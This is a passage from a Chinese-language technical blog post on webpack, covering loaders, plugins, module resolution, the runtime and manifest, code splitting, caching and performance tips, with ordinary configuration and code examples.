指定要输出的文件名称</span><br>      <span class="hljs-attr">import</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 启动时需加载的模块</span><br>      <span class="hljs-attr">library</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 指定 library 选项，为当前 entry 构建一个 library</span><br>      <span class="hljs-attr">runtime</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 运行时 chunk 的名字。如果设置了，就会创建一个新的运行时 chunk。在 webpack 5.43.0 之后可将其设为 false 以避免一个新的运行时 chunk</span><br>      <span class="hljs-attr">publicPath</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 当该入口的输出文件在浏览器中被引用时，为它们指定一个公共 URL 地址</span><br>    &#125;,<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>runtime 和 dependOn 不应在同一个入口上同时使用</li><li>确保 runtime 不能指向已存在的入口名称</li><li>dependOn 不能是循环引用的</li></ul><h3 id="经验之谈"><a href="#经验之谈" class="headerlink" title="经验之谈"></a>经验之谈</h3><ul><li>在webpack4.x及以上版本，不要为 vendor 或其他不是执行起点创建 entry，而是使用 optimization.splitChunks 选项，将 vendor 和 app(应用程序) 模块分开，并为其创建一个单独的文件</li><li>每个 HTML 文档只使用一个入口起点</li></ul><h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>loader用于转换某些类型的模块，webpack 只能理解 JavaScript 和 JSON 文件，这是 webpack 开箱可用的自带能力。loader 让 webpack 能够去处理其他类型的文件，并将它们转换为有效模块，以供应用程序使用，以及被添加到依赖图中。</p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><ul><li>配置方式：在 webpack.config.js 文件中指定 loader</li><li>内联方式：在每个 import 语句中显式指定 loader，通过为内联 import 语句添加前缀，可以覆盖配置文件中的所有 loader, preLoader 和 postLoader</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 传递参数（类似 webpack 配置中的 options）</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;style-loader!css-loader?modules=true!./styles.css&#x27;</span><br><br><span class="hljs-comment">// 多个参数用 &amp; 分隔</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;url-loader?limit=1024&amp;name=images/[hash].[ext]!./image.png&#x27;</span><br><br><span class="hljs-comment">// 使用 ! 前缀，将禁用所有已配置的 normal loader(普通 loader)</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Styles</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;!style-loader!css-loader?modules!./styles.css&#x27;</span><br><br><span class="hljs-comment">// 使用 !! 前缀，将禁用所有已配置的 loader（preLoader, loader, postLoader）</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Styles</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;!!style-loader!css-loader?modules!./styles.css&#x27;</span><br><br><span class="hljs-comment">// 使用 -! 前缀，将禁用所有已配置的 preLoader 和 loader，但是不禁用 postLoaders</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Styles</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;-!style-loader!css-loader?modules!./styles.css&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>loader本质上是<strong>导出为函数的JavaScript模块</strong>，webpack内部的loader runner会调用该函数，并将上一个loader的输出结果作为参数传给该函数</li><li>loader的执行顺序是从右到左，从下到上，可以通过enforce配置项或loader的pitch方法改变执行顺序，<strong>最后一个loader的输出结果应该为String或Buffer类型</strong></li><li>loader可以是同步的，也可以是异步的</li><li>loader运行在Node.js中</li><li>loader内部的this上可访问的属性和方法都通过loader context上下文绑定</li></ul><h3 id="编写一个loader"><a href="#编写一个loader" class="headerlink" title="编写一个loader"></a>编写一个loader</h3><p><strong>my-loader.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 同步loader</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source, map, meta</span>) &#123;<br>  <span class="hljs-comment">// 单个处理结果可以直接return</span><br>  <span class="hljs-comment">// return doSomething(source)</span><br>  <span class="hljs-comment">// 多个处理结果则必须调用this.callback()</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-title function_">doSomething</span>(source), map, meta)<br>  <span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 异步loader，必须调用this.async()来告知loader runner等待异步输出结果</span><br><span class="hljs-comment">// 它会返回 this.callback() 回调函数。随后 loader 必须返回 undefined 并且调用该回调函数</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source, map, meta</span>) &#123;<br>  <span class="hljs-keyword">var</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">async</span>()<br>  <span class="hljs-title function_">doSomeAsyncthing</span>(source, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, res</span>) &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(err)<br>    &#125;<br>    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, res, map, meta)<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="plugin"><a href="#plugin" class="headerlink" title="plugin"></a>plugin</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>webpack插件是一个具有 <strong>apply</strong> 方法的 JavaScript 类。apply 方法会被 webpack compiler 调用，并且在 <strong>整个</strong> 编译生命周期都可以访问 compiler 对象，插件目的在于解决 loader 无法实现的其他事，包括：打包优化，资源管理，注入环境变量。</p><h3 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h3><ul><li>配置方式：在webpack.config.js文件中，向 plugins 属性传入一个 new 实例</li><li>Node API方式：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> webpack = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack&#x27;</span>) <span class="hljs-comment">// 访问 webpack 运行时(runtime)</span><br><span class="hljs-keyword">const</span> configuration = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.config.js&#x27;</span>)<br><br><span class="hljs-keyword">let</span> compiler = <span class="hljs-title function_">webpack</span>(configuration)<br><br><span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">ProgressPlugin</span>().<span class="hljs-title function_">apply</span>(compiler)<br><br>compiler.<span class="hljs-title function_">run</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err, stats</span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="编写一个plugin"><a href="#编写一个plugin" class="headerlink" title="编写一个plugin"></a>编写一个plugin</h3><p>一个生成构建文件清单的插件：</p><p><strong>fileListPlugin.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileListPlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;<br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    &#125;, options)<br>  &#125;<br>  <br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; filename, title &#125; = <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span><br>    <br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">&#x27;FileListPlugin&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">compilation, callback</span>) &#123;<br>      <span class="hljs-comment">// 创建文件内容</span><br>      <span class="hljs-keyword">let</span> fileList = title<br>      <br>      <span class="hljs-comment">// 遍历所有编译资源</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> asset <span class="hljs-keyword">in</span> compilation.<span class="hljs-property">assets</span>) &#123;<br>        <span class="hljs-keyword">const</span> size = compilation.<span class="hljs-property">assets</span>[asset].<span class="hljs-title function_">size</span>()<br>        fileList += <span class="hljs-string">`- <span class="hljs-subst">$&#123;asset&#125;</span> (<span class="hljs-subst">$&#123;size&#125;</span> bytes)\n`</span><br>      &#125;<br>      <br>      <span class="hljs-comment">// 将清单作为新资源添加到编译中</span><br>      compilation.<span class="hljs-property">assets</span>[filename] = &#123;<br>        <span class="hljs-attr">source</span>: <span class="hljs-function">() =&gt;</span> fileList,<br>        <span class="hljs-attr">size</span>: <span class="hljs-function">() =&gt;</span> fileList.<span class="hljs-property">length</span><br>      &#125;<br>      <br>      <span class="hljs-title function_">callback</span>()<br>    &#125;)<br>  &#125;<br>&#125;<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title class_">FileListPlugin</span><br></code></pre></td></tr></table></figure><h2 id="模块解析"><a href="#模块解析" class="headerlink" title="模块解析"></a>模块解析</h2><p>webpack 使用 enhanced-resolve 来解析文件路径，支持三种文件路径的解析：</p><ul><li>相对路径：<code>import &#39;../src/file1&#39;</code></li><li>绝对路径：<code>import &#39;/home/me/file&#39;</code></li><li>模块路径：<code>import &#39;module/lib/file&#39;</code></li></ul><h3 id="解析规则"><a href="#解析规则" class="headerlink" title="解析规则"></a>解析规则</h3><p>当文件路径类型为模块路径时，路径解析遵循以下规则：</p><ul><li>基于webpack.config.js中配置的resolve.modules中指定的目录（默认是<code>[&#39;node_modules&#39;]</code>）进行检索，如果添加一个目录到模块搜索目录，此目录优先于 node_modules&#x2F; 搜索</li></ul><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">modules</span>: [path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;src&#x27;</span>), <span class="hljs-string">&#x27;node_modules&#x27;</span>],<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 将优先从src目录下开始检索</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Tabs</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;antd&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>如果模块（package）中有package.json文件，则在resolve.exportsFields配置项中指定的字段会被依次查找，优先级高于package.json中的main&#x2F;module字段</li></ul><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">exportsFields</span>: [<span class="hljs-string">&#x27;exports&#x27;</span>, <span class="hljs-string">&#x27;myCompanyExports&#x27;</span>],<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>myPkg中的package.json</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;myPkg&#x27;</span>,<br>  <span class="hljs-attr">scripts</span>: &#123;&#125;,<br>  <span class="hljs-attr">exports</span>: &#123;<br>    <span class="hljs-string">&#x27;.&#x27;</span>: &#123;<br>      <span class="hljs-string">&quot;require&quot;</span>: <span class="hljs-string">&quot;./index.cjs&quot;</span>,<br>      <span class="hljs-string">&quot;import&quot;</span>: <span class="hljs-string">&quot;./index.mjs&quot;</span>,<br>    &#125;,<br>  &#125;,<br>  <span class="hljs-attr">myCompanyExports</span>: &#123;<br>    <span class="hljs-string">&#x27;.&#x27;</span>: &#123;<br>      <span class="hljs-string">&quot;require&quot;</span>: <span class="hljs-string">&quot;./index.cjs&quot;</span>,<br>      <span class="hljs-string">&quot;import&quot;</span>: <span class="hljs-string">&quot;./index.mjs&quot;</span>,<br>    &#125;,<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ES模块导入</span><br><span class="hljs-keyword">import</span> myPkg <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;myPkg&#x27;</span><br><span class="hljs-comment">// CommonJS模块导入</span><br><span class="hljs-keyword">const</span> myPkg = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;myPkg&#x27;</span>)<br></code></pre></td></tr></table></figure><p>一旦根据上述规则解析路径后，enhanced-resolve 将会检查路径是指向文件还是文件夹。</p><p>如果路径指向文件：</p><ul><li>如果文件具有扩展名，则直接将文件打包</li><li>否则，将使用 resolve.extensions 选项作为文件扩展名来解析，此选项会告诉解析器在解析中能够接受那些扩展名（例如 .js，.jsx）</li></ul><p>如果路径指向一个文件夹，则进行如下步骤寻找具有正确扩展名的文件：</p><ul><li>如果文件夹中包含 package.json 文件，则会根据 resolve.mainFields 配置中的字段顺序查找，并根据 package.json 中的符合配置要求的第一个字段来确定文件路径。</li></ul><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">mainFields</span>: [<span class="hljs-string">&#x27;browser&#x27;</span>, <span class="hljs-string">&#x27;module&#x27;</span>, <span class="hljs-string">&#x27;main&#x27;</span>],<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>myPkg中的package.json</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&#x27;myPkg&#x27;</span>,<br>  <span class="hljs-string">&quot;browser&quot;</span>: <span class="hljs-string">&quot;build/myPkg.js&quot;</span>,<br>  <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;index&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 从build/myPkg.js中查找</span><br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> myPkg <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;myPkg&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>如果不存在 package.json 文件或 resolve.mainFields 没有返回有效路径，则会根据 resolve.mainFiles 配置选项中指定的文件名顺序查找，看是否能在 import&#x2F;require 的目录下匹配到一个存在的文件名</li><li>然后使用 resolve.extensions 选项，以类似的方式解析文件扩展名</li></ul><h2 id="runtime和mainfest"><a href="#runtime和mainfest" class="headerlink" title="runtime和mainfest"></a>runtime和mainfest</h2><p>在使用 webpack 构建的典型应用程序或站点中，有三种主要的代码类型：</p><ul><li>你或你的团队编写的源码。</li><li>你的源码会依赖的任何第三方的 library 或 “vendor” 代码。</li><li>webpack 的 runtime 和 manifest，管理所有模块的交互。</li></ul><h3 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h3><p>主要指在浏览器运行过程中，webpack用来连接各个模块化代码的代码，runtime代码使模块化代码能加载和解析其他的模块化代码，从而与其他模块化代码交互。可以使用 <code>optimization.runtimeChunk: &#39;single&#39;</code> 选项将 runtime 代码拆分为一个单独的 chunk。</p><h3 id="mainfest"><a href="#mainfest" class="headerlink" title="mainfest"></a>mainfest</h3><p>mainfest是一张映射表，记录了模块打包后的关键元数据，用来在运行时管理模块的加载和依赖关系。理解 Manifest 是掌握 Webpack 运行机制的关键，尤其在 <strong>代码分割</strong> 和 <strong>缓存策略</strong> 优化中至关重要！</p><p>mainfest的主要作用有以下三点：</p><ul><li>模块标识：将打包前的模块路径映射为打包后的模块ID</li><li>动态加载：管理异步加载的模块（如import()拆分的代码块）</li><li>缓存优化：通过内容哈希实现持久缓存</li></ul><p>典型的mainfest内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;./src/index.js&quot;</span>: <span class="hljs-number">0</span>,          <span class="hljs-comment">// 模块路径 → 模块ID</span><br>    <span class="hljs-string">&quot;./src/utils.js&quot;</span>: <span class="hljs-number">1</span><br>  &#125;,<br>  <span class="hljs-string">&quot;chunks&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;main&quot;</span>: &#123;                     <span class="hljs-comment">// 入口代码块</span><br>      <span class="hljs-string">&quot;js&quot;</span>: <span class="hljs-string">&quot;main.abc123.js&quot;</span>,     <span class="hljs-comment">// 生成的文件名</span><br>      <span class="hljs-string">&quot;contains&quot;</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]          <span class="hljs-comment">// 包含的模块ID</span><br>    &#125;,<br>    <span class="hljs-string">&quot;async-chunk&quot;</span>: &#123;              <span class="hljs-comment">// 异步代码块</span><br>      <span class="hljs-string">&quot;js&quot;</span>: <span class="hljs-string">&quot;async.def456.js&quot;</span>,<br>      <span class="hljs-string">&quot;loaded&quot;</span>: <span class="hljs-literal">false</span>             <span class="hljs-comment">// 标记是否已加载</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-string">&quot;runtime&quot;</span>: <span class="hljs-string">&quot;runtime.xyz789.js&quot;</span>  <span class="hljs-comment">// Webpack 运行时代码</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代码分离"><a href="#代码分离" class="headerlink" title="代码分离"></a>代码分离</h2><p>代码分离是webpack比较重要的特性，它能够将代码分离到不同的bundle，然后按需加载或并行加载，控制资源加载的优先级，提升页面加载速度，常见的代码分离方式有三种：</p><ul><li>入口分离：通过entry配置将三方库（如react、antd等）配置成单独的entry，实现vendor分离</li><li>防止重复：使用入口依赖（entry dependOn）或splitChunksPlugin去重和分离chunk</li><li>动态导入：将顶部的<code>import _ from lodash</code>改为在实际需要lodash的地方引入<code>import(lodash).then((&#123; default: _ &#125;) =&gt; &#123;&#125;)</code></li></ul><p>Webpack v4.6.0+ 增加了对预获取和预加载的支持:</p><ul><li>预获取：<code>import(/* webpackPrefetch: true */ &#39;./path/to/LoginModal.js&#39;)</code></li><li>预加载：<code>import(/* webpackPreload: true */ &#39;ChartingLibrary&#39;)</code></li></ul><p>可以使用webpack官方分析工具或者其他三方工具（webpack-bundle-analyzer、webpack-visualizer等）分析分离后的bundle，进一步优化代码</p><h2 id="缓存-性能优化"><a href="#缓存-性能优化" class="headerlink" title="缓存&#x2F;性能优化"></a>缓存&#x2F;性能优化</h2><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><ul><li>基于浏览器缓存规则，对output.filename使用contenthash可使文件名根据文件内容变化而变化</li><li>使用 <code>optimization.runtimeChunk: &#39;single&#39;</code> 选项将 runtime 代码拆分为一个单独的 chunk</li><li>使用 <strong>splitChunksPlugin</strong>插件的cacheGroup选项来缓存很少修改的三方库</li><li>通过模块标识符（<code>optimization.moduleIds: &#39;deterministic&#39;</code>）保证多次构建后三方vendor的文件名hash值不变</li></ul><h3 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h3><ul><li>使用最新版本的webpack、node、npm</li><li>精准使用loader，通过include&#x2F;exclude排查不需要转换的资源</li><li>尽可能少使用loader&#x2F;plugin，它们会额外的消耗性能</li><li>精确的匹配文件资源，减少资源解析的时间，减少resolve.modules, resolve.extensions, resolve.mainFiles, resolve.descriptionFiles 中条目数量，因为他们会增加文件系统调用的次数：<code>import &#39;./src/demo&#39;</code>改为<code>import &#39;./src/demo.js&#39;</code>，resolve.extensions: [‘.js’, ‘.jsx’]</li><li>使用Dllplugin为更改不频繁的代码单独编译</li><li>使用更少&#x2F;更小的三方库，删除未使用的代码，更合理的分离chunk，减少大体积资源的生成</li><li>使用thread-loader将耗资源的loader交给worker池</li><li>使用webpack的cache并配合package.json中的postinstall清除缓存目录实现持久化缓存</li><li>移除webpack ProgressPlugin，该插件没多大实际用途，且耗费资源</li><li>分环境使用loader&#x2F;plugin，不要紧生产环境、开发环境的loader、plugin混用</li><li>使用webpack压缩工具压缩生产环境代码</li><li>source-map非常消耗资源，生产环境应禁用</li><li>合理的使用webpack三方工具（babel、typescript、sass等）</li><li>webpack5.x支持模块联邦，可以在微前端架构中提取公共模块</li><li>合理使用tree shaking：通过webpack的optimization.usedExports: true配合package.json的sideEffects: false将文本标记为无副作用。tree shaking只适用于ES2015以上的import&#x2F;export语法</li><li>真正意义上的懒加载：比如button click事件触发时再动态import lodash</li></ul><h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p>webpack运行环境和webpack构建出来的项目的运行环境不是一个概念，webpack基于Node.js运行，webpack构建出来的项目一般基于浏览器环境运行</p><h3 id="浏览器兼容性"><a href="#浏览器兼容性" class="headerlink" title="浏览器兼容性"></a>浏览器兼容性</h3><p>webpack支持所有符合ES5标准的浏览器（不支持IE8及以下版本），如果想兼容旧版本浏览器，需要加载polyfill：</p><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;babel-polyfill&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"></span>) &#123;&#125;<br></code></pre></td></tr></table></figure><h3 id="配置兼容性"><a href="#配置兼容性" class="headerlink" title="配置兼容性"></a>配置兼容性</h3><p>webpack.config.js配置文件是webpack运行过程中本身需要的文件，应避免ES6语法编写代码：</p><ul><li>webpack基于Node.js运行，遵循CommonJS规范</li><li>Node.js v12.x及以上版本才开始支持原生ES6模块（.mjs）,v14.x及以上版本才稳定支持ES6</li><li>webpack原生支持ES6模块是指支持项目代码中的import&#x2F;export语句，但仅限于模块化依赖分析，不包含语法转换。Webpack 会将 import&#x2F;export 转换为自己的模块系统（如__webpack_require__），实现代码拆分和依赖管理。</li></ul><h2 id="零碎知识"><a href="#零碎知识" class="headerlink" title="零碎知识"></a>零碎知识</h2><ul><li>webpack通过mode配置项设置模式，mode取值范围：string &#x3D; ‘production’: ‘none’ | ‘development’ | ‘production’</li><li>webpack通过target配置项设置构建目标，默认值为 “browserslist”，target: string | [string] | false，多target通过多个独立的配置来实现：module.exports &#x3D; [serverConfig, clientConfig]</li><li>开发环境通过source-map跟踪堆栈信息（<code>devtool: &#39;inline-source-map&#39;</code>），生产环境不建议使用source-map</li><li>webpack 提供了几种可选方式帮助在代码发生变化后自动编译代码：–watch、webpack-dev-server、webpack-dev-middleware，watch模式需要手动刷新浏览器，middleware是server的内部实现核心，middleware+express -&gt; server</li><li>publicPath 配置选项在各种场景中都非常有用。可以通过它来指定应用程序中所有资源的基础路径</li><li>webpack5.x版本新增了资源模块，可以不再需要像之前的版本配置各种loader来转换静态资源（图片、字体等）</li><li>命令行接口参数的优先级高于配置文件中的参数，例如：<code>build: webpack --mode=&quot;production&quot;</code>会优于webpack.config.js中的<code>mode: development</code></li><li>可以结合mainfest和stats data分析数据，优化构建性能，mainfest存在于运行时（浏览器环境），stats data存在于构建后（本地json，不影响运行时）</li></ul>]]></content>
    
    
    <categories>
      
      <category>Webpack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Webpack</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
